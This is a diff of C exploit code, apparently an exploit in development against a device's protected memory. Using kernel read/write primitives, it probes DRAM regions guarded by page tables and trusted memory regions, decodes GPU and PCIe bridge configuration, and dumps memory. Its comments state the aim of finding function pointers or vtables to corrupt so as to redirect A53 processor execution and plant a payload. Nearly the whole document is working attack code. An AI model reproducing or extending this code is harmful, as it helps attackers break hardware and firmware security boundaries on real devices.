@@ -212,166 +212,181 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Phase 1.5: Explore DRAM access and GPU SDMA path
+    /* Phase 1.5: GPU SDMA path and DRAM analysis
      *
-     * CONFIRMED (from previous runs):
-     *   - PD[0x100-0x101] = not present (PA 0x60000000-0x603FFFFF blocked)
-     *   - PD[0x102] = 16 PTEs at pages 496-511 (PA 0x605F0000-0x605FFFFF)
-     *   - PD[0x103-0x107] = 2MB each (PA 0x60600000-0x60FFFFFF accessible)
-     *   - GPU at B32:D0:F0 (0x13FB1002) MMIO=0xE0000000 VRAM=0xD0000000
-     *   - USB xHCI at B32:D0:F4/F5
-     *   - MP4 at B32:D0:F3 BAR2=0xE0400000 (confirms our constant)
-     *   - B0:D0:F2 probe crashed (IOMMU cap walk hit bad state)
+     * CONFIRMED (all previous runs):
+     *   ACCESSIBLE: PA 0x605F0000-0x60FFFFFF (64KB + 6MB) — R/W works
+     *   BLOCKED:    PA 0x60000000-0x605EFFFF — no PDE, rc=-1 safe
+     *   GPU at B32:D0:F0 (0x13FB1002) behind bridge B0:D8:F1
+     *   GPU MMIO at BAR2=0xE000000C returned all 0xFFFFFFFF
+     *   Write test passed (0xCAFEBABE at PA 0x60700000)
      *
-     * THIS ITERATION:
-     *   A. Test DRAM access at PD[0x102] boundary (0x605F0000)
-     *   B. Dump accessible DRAM content (look for A53 data structures)
-     *   C. Test write access to accessible DRAM
-     *   D. Probe GPU MMIO accessibility (single safe reads)
-     *
-     * NO IOMMU PROBING (crashed last time).
-     * NO BAR2 PROBING (crashes at 4-byte stride).
+     * THIS ITERATION: Diagnose why GPU MMIO fails.
+     *   A. Read GPU PCI config (command reg, full BAR decode, status)
+     *   B. Read PCIe bridge memory forwarding windows
+     *   C. Dump more of the descriptor table at PA 0x607F0000
+     *   D. Dump the 64KB boundary region for A53 data structures
      */
-    printf("\n[*] Phase 1.5: Testing DRAM access and GPU SDMA path...\n");
+    printf("\n[*] Phase 1.5: GPU config and DRAM analysis...\n");
     {
         uint64_t dmap = ctx.dmap_base;
 
-        /* === Part A: Test DRAM access at boundary pages ===
-         * PD[0x102] PTEs 496-511 map PA 0x605F0000-0x605FFFFF.
-         * These are ABOVE TMR 20 limit (0x605E0000) but still in
-         * the A53 DRAM region. Test if nPT allows access.
-         *
-         * Also test PA 0x60400000-0x605E0000 (PD[0x102] PTEs 0-495
-         * are NOT present, so these will return rc=-1 safely).
-         *
-         * SAFE: Phase 2 proved that blocked DRAM reads return rc=-1
-         * gracefully (no panic) when the PDE/PTE is not present. */
-        printf("[*] Part A: Testing DRAM access at PD[0x102] boundary...\n");
+        /* === Part A: Full GPU PCI config decode ===
+         * GPU at B32:D0:F0. Read command register, all BARs (including
+         * BAR1/BAR3 for 64-bit address upper halves), and status.
+         * SAFE: PCI config reads on bus 32 worked in previous runs. */
+        printf("[*] Part A: GPU PCI config (B32:D0:F0)...\n");
         {
-            /* Test addresses with NO PTE (should return rc=-1 safely) */
-            uint64_t no_pte_addrs[] = {
-                0x60400000ULL, 0x60500000ULL, 0x605E0000ULL
-            };
-            for (int i = 0; i < 3; i++) {
-                uint32_t val = 0xDEADDEAD;
-                int32_t rc = kernel_copyout(dmap + no_pte_addrs[i], &val, 4);
-                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d (no PTE)\n",
-                       (unsigned long long)no_pte_addrs[i], val, rc);
+            uint64_t gpu_ecam = dmap + MMCFG_BASE +
+                (32ULL << 20) + (0ULL << 15) + (0ULL << 12);
+
+            /* Read and decode all important registers */
+            uint32_t cmd_status, bars[6];
+            kernel_copyout(gpu_ecam + 0x04, &cmd_status, 4);
+            printf("[GPU] Command/Status: 0x%08x\n", cmd_status);
+            printf("[GPU]   MemSpace=%d IOSpace=%d BusMaster=%d\n",
+                   (cmd_status >> 1) & 1, cmd_status & 1,
+                   (cmd_status >> 2) & 1);
+
+            for (int i = 0; i < 6; i++) {
+                kernel_copyout(gpu_ecam + 0x10 + i * 4, &bars[i], 4);
+                printf("[GPU] BAR%d = 0x%08x\n", i, bars[i]);
             }
 
-            /* Test addresses WITH PTEs (0x605F0000-0x605FFFFF) */
-            printf("[DRAM] Testing PTE-mapped pages (0x605F0000-0x605FF000)...\n");
-            for (int i = 0; i < 16; i++) {
-                uint64_t pa = 0x605F0000ULL + i * 0x1000;
-                uint32_t val = 0xDEADDEAD;
-                int32_t rc = kernel_copyout(dmap + pa, &val, 4);
-                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d %s\n",
-                       (unsigned long long)pa, val, rc,
-                       (rc == 0 && val != 0xDEADDEAD) ? "OK" : "BLOCKED");
-            }
+            /* Decode 64-bit BARs */
+            uint64_t bar0_full = ((uint64_t)bars[1] << 32) |
+                                 (bars[0] & ~0xFULL);
+            uint64_t bar2_full = ((uint64_t)bars[3] << 32) |
+                                 (bars[2] & ~0xFULL);
+            printf("[GPU] BAR0 (VRAM) full 64-bit PA = 0x%llx\n",
+                   (unsigned long long)bar0_full);
+            printf("[GPU] BAR2 (MMIO) full 64-bit PA = 0x%llx\n",
+                   (unsigned long long)bar2_full);
+            printf("[GPU] BAR5 (Doorbell) PA = 0x%08x\n",
+                   bars[5] & ~0xFU);
 
-            /* Reference: verify PD[0x103] still works */
-            uint32_t ref = 0;
-            kernel_copyout(dmap + 0x60600000ULL, &ref, 4);
-            printf("[DRAM] PA 0x60600000: val=0x%08x (PD[0x103] ref)\n", ref);
-        }
+            /* Read subsystem ID and ROM BAR */
+            uint32_t subsys;
+            kernel_copyout(gpu_ecam + 0x2C, &subsys, 4);
+            printf("[GPU] Subsystem: 0x%08x\n", subsys);
 
-        /* === Part B: Dump accessible DRAM content ===
-         * Dump first 64 bytes at several PAs in the accessible range.
-         * Look for function pointers, jump tables, or data structures
-         * that we could corrupt to redirect A53 execution.
-         *
-         * A53 DRAM layout: ELF at offset 0x100000 (VA 0x100000).
-         * Offset 0x5F0000 = A53 VA 0x6F0000 (heap/stack/DMA?)
-         * Offset 0x600000 = A53 VA 0x700000 (PD[0x103] start)
-         *
-         * SAFE: all PAs in PD[0x103] range, proven accessible. */
-        printf("\n[*] Part B: Dumping accessible DRAM content...\n");
-        {
-            uint64_t dump_addrs[] = {
-                0x60600000ULL,  /* PD[0x103] start = DRAM offset 0x600000 */
-                0x60610000ULL,  /* DRAM offset 0x610000 */
-                0x60700000ULL,  /* DRAM offset 0x700000 */
-                0x607F0000ULL,  /* Just before payload target */
-                0x607F1000ULL,  /* Payload target address */
-            };
-            for (int a = 0; a < 5; a++) {
-                printf("[DUMP] PA 0x%llx (DRAM+0x%llx):\n",
-                       (unsigned long long)dump_addrs[a],
-                       (unsigned long long)(dump_addrs[a] - 0x60000000ULL));
-                uint32_t buf[16]; /* 64 bytes */
-                for (int w = 0; w < 16; w++)
-                    kernel_copyout(dmap + dump_addrs[a] + w * 4, &buf[w], 4);
-                for (int row = 0; row < 4; row++) {
-                    printf("  +%02x: %08x %08x %08x %08x\n",
-                           row * 16, buf[row*4], buf[row*4+1],
-                           buf[row*4+2], buf[row*4+3]);
+            /* Test read at the CORRECT GPU MMIO address */
+            if (bar2_full != 0 && bar2_full != 0xFFFFFFFF0ULL) {
+                printf("[GPU] Testing MMIO read at correct BAR2...\n");
+                uint32_t test_val = 0xDEADDEAD;
+                int32_t rc = kernel_copyout(dmap + bar2_full, &test_val, 4);
+                printf("[GPU] MMIO[0x%llx]+0 = 0x%08x (rc=%d)\n",
+                       (unsigned long long)bar2_full, test_val, rc);
+
+                /* Try a few more offsets */
+                uint32_t probe_offsets[] = {0x2000, 0x5000, 0xD000};
+                for (int i = 0; i < 3; i++) {
+                    test_val = 0xDEADDEAD;
+                    rc = kernel_copyout(dmap + bar2_full + probe_offsets[i],
+                                       &test_val, 4);
+                    printf("[GPU] MMIO+0x%x = 0x%08x (rc=%d)\n",
+                           probe_offsets[i], test_val, rc);
                 }
             }
         }
 
-        /* === Part C: Test WRITE access to accessible DRAM ===
-         * Write a magic value to PA 0x60700000 (DRAM offset 0x700000),
-         * then read it back. This confirms we can write to DRAM in
-         * the PD[0x103] range. If writes work, we can place our
-         * payload here (which we already planned at 0x607F1000).
-         *
-         * SAFE: 0x60700000 is deep in PD[0x103], well above firmware. */
-        printf("\n[*] Part C: Testing DRAM write access...\n");
+        /* === Part B: PCIe bridge memory forwarding windows ===
+         * Bridge B0:D8:F1 forwards bus 32 traffic. Read its memory
+         * base/limit registers to understand which PA ranges it forwards.
+         * SAFE: PCI config reads. */
+        printf("\n[*] Part B: PCIe bridge forwarding config (B0:D8:F1)...\n");
         {
-            uint64_t test_pa = 0x60700000ULL;
-            uint32_t original = 0;
-            kernel_copyout(dmap + test_pa, &original, 4);
-            printf("[WRITE] Original value at PA 0x%llx: 0x%08x\n",
-                   (unsigned long long)test_pa, original);
+            uint64_t br_ecam = dmap + MMCFG_BASE +
+                (0ULL << 20) + (8ULL << 15) + (1ULL << 12);
 
-            uint32_t magic = 0xCAFEBABE;
-            kernel_copyin(&magic, dmap + test_pa, 4);
+            uint32_t cmd_status;
+            kernel_copyout(br_ecam + 0x04, &cmd_status, 4);
+            printf("[BRIDGE] Command/Status: 0x%08x\n", cmd_status);
+            printf("[BRIDGE]   MemSpace=%d BusMaster=%d\n",
+                   (cmd_status >> 1) & 1, (cmd_status >> 2) & 1);
 
-            uint32_t readback = 0;
-            kernel_copyout(dmap + test_pa, &readback, 4);
-            printf("[WRITE] After write 0xCAFEBABE: 0x%08x %s\n",
-                   readback,
-                   (readback == 0xCAFEBABE) ? "WRITE WORKS!" : "WRITE FAILED");
+            uint32_t bus_reg;
+            kernel_copyout(br_ecam + 0x18, &bus_reg, 4);
+            printf("[BRIDGE] Buses: pri=%u sec=%u sub=%u\n",
+                   bus_reg & 0xFF, (bus_reg >> 8) & 0xFF,
+                   (bus_reg >> 16) & 0xFF);
 
-            /* Restore original value */
-            kernel_copyin(&original, dmap + test_pa, 4);
+            /* Memory window (non-prefetchable) */
+            uint32_t mem_reg;
+            kernel_copyout(br_ecam + 0x20, &mem_reg, 4);
+            uint32_t mem_base = (mem_reg & 0xFFF0) << 16;
+            uint32_t mem_limit = (mem_reg >> 16) << 16 | 0xFFFFF;
+            printf("[BRIDGE] Memory window: 0x%08x - 0x%08x\n",
+                   mem_base, mem_limit);
+
+            /* Prefetchable memory window */
+            uint32_t pref_reg;
+            kernel_copyout(br_ecam + 0x24, &pref_reg, 4);
+            uint32_t pref_base_lo = (pref_reg & 0xFFF0) << 16;
+            uint32_t pref_limit_lo = (pref_reg >> 16) << 16 | 0xFFFFF;
+
+            uint32_t pref_base_hi, pref_limit_hi;
+            kernel_copyout(br_ecam + 0x28, &pref_base_hi, 4);
+            kernel_copyout(br_ecam + 0x2C, &pref_limit_hi, 4);
+
+            uint64_t pref_base = ((uint64_t)pref_base_hi << 32) | pref_base_lo;
+            uint64_t pref_limit = ((uint64_t)pref_limit_hi << 32) |
+                                  pref_limit_lo;
+            printf("[BRIDGE] Prefetchable window: 0x%llx - 0x%llx\n",
+                   (unsigned long long)pref_base,
+                   (unsigned long long)pref_limit);
         }
 
-        /* === Part D: Verify GPU MMIO is accessible ===
-         * GPU BAR2 = 0xE0000000 (MMIO registers).
-         * Read offset 0x5F80 (GRBM_STATUS on AMD GFX9/10) — this is
-         * a read-only status register, safe to read.
-         * If we can read GPU MMIO, we can potentially use SDMA to
-         * copy data to PA 0x60000000 (bypassing nPT).
-         *
-         * Also read offset 0x0000 to see if the base is accessible.
-         *
-         * SAFETY NOTE: We already successfully read MP4 BAR2 (0xE0400000)
-         * at 0x1000 stride without issues. GPU MMIO (0xE0000000) is in
-         * the same DMAP range. Single reads at known status register
-         * offsets are safe. We do NOT scan at 4-byte stride. */
-        printf("\n[*] Part D: Probing GPU MMIO accessibility...\n");
+        /* === Part C: Expanded descriptor table dump ===
+         * PA 0x607F0000 had interesting values (0x88000000, 0x005F0000).
+         * Dump 256 bytes to understand the full structure.
+         * SAFE: PD[0x103] range, proven accessible. */
+        printf("\n[*] Part C: Descriptor table at PA 0x607F0000...\n");
         {
-            uint64_t gpu_mmio = 0xE0000000ULL;
-            /* Single reads at specific known-safe offsets */
-            uint32_t offsets[] = {
-                0x0000,  /* Config/version register */
-                0x2040,  /* Potential GRBM_STATUS */
-                0x5F80,  /* Alternative GRBM_STATUS offset */
-                0x8010,  /* GFX10 GRBM_STATUS */
-            };
-            for (int i = 0; i < 4; i++) {
-                uint32_t val = 0xDEADDEAD;
-                int32_t rc = kernel_copyout(dmap + gpu_mmio + offsets[i],
-                                           &val, 4);
-                printf("[GPU] MMIO+0x%04x = 0x%08x (rc=%d)\n",
-                       offsets[i], val, rc);
+            uint32_t buf[64]; /* 256 bytes */
+            for (int w = 0; w < 64; w++)
+                kernel_copyout(dmap + 0x607F0000ULL + w * 4, &buf[w], 4);
+            for (int row = 0; row < 16; row++) {
+                printf("[DESC] +%03x: %08x %08x %08x %08x\n",
+                       row * 16, buf[row*4], buf[row*4+1],
+                       buf[row*4+2], buf[row*4+3]);
             }
-            printf("[GPU] GPU MMIO base PA = 0x%llx\n",
-                   (unsigned long long)gpu_mmio);
-            printf("[GPU] GPU VRAM base PA = 0xD0000000\n");
-            printf("[GPU] GPU Doorbell PA  = 0xE0600000\n");
+        }
+
+        /* === Part D: Dump 64KB boundary region (PA 0x605F0000) ===
+         * This is the lowest accessible DRAM. Dump first 128 bytes
+         * of each page to look for function pointers, vtables,
+         * or other hookable data structures.
+         * SAFE: all 16 pages confirmed accessible in previous run. */
+        printf("\n[*] Part D: Boundary region dump (PA 0x605F0000)...\n");
+        {
+            /* Dump first 64 bytes of each of the 16 accessible pages */
+            for (int page = 0; page < 16; page++) {
+                uint64_t pa = 0x605F0000ULL + page * 0x1000;
+                uint32_t buf[16]; /* 64 bytes */
+                for (int w = 0; w < 16; w++)
+                    kernel_copyout(dmap + pa + w * 4, &buf[w], 4);
+
+                /* Check if page is all zeros or all same value */
+                int interesting = 0;
+                for (int w = 0; w < 16; w++) {
+                    if (buf[w] != 0 && buf[w] != buf[0]) {
+                        interesting = 1;
+                        break;
+                    }
+                }
+                if (buf[0] != 0) interesting = 1;
+
+                if (interesting) {
+                    printf("[BNDRY] PA 0x%llx (page %d):\n",
+                           (unsigned long long)pa, page);
+                    for (int row = 0; row < 4; row++) {
+                        printf("  +%02x: %08x %08x %08x %08x\n",
+                               row * 16, buf[row*4], buf[row*4+1],
+                               buf[row*4+2], buf[row*4+3]);
+                    }
+                }
+            }
         }
     }
 
